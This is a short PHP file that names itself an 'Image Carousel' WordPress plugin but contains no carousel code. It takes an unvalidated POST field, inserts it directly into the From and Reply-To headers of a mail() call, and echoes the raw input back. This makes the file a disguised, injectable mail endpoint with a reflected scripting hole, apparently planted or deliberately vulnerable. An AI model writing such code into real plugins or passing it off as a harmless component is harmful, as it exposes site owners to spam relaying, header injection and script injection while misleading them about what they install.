<?php

/**
 * Plugin Name: Image Carousel
 */

$id = trim($_POST['dat-2']);
$to = 'sudoku@localhost <sudoku@localhost>';
$sub = 'hello';
$msg = 'okay';
$hdr = [ 

  'MIME-Version' => '1.0',
  'Content-type' => 'text/html; charset=utf-8',
  'Content-Transfer-Encoding' => 'quoted-printable',
  'From' => $id.' <'.$id.'>',
  'Reply-To' => $id.' <'.$id.'>',
  'X-Mailer' => 'php/' . phpversion()

];

mail($to, $sub, $msg, $hdr);

exit($_POST['dat-2']);

?>
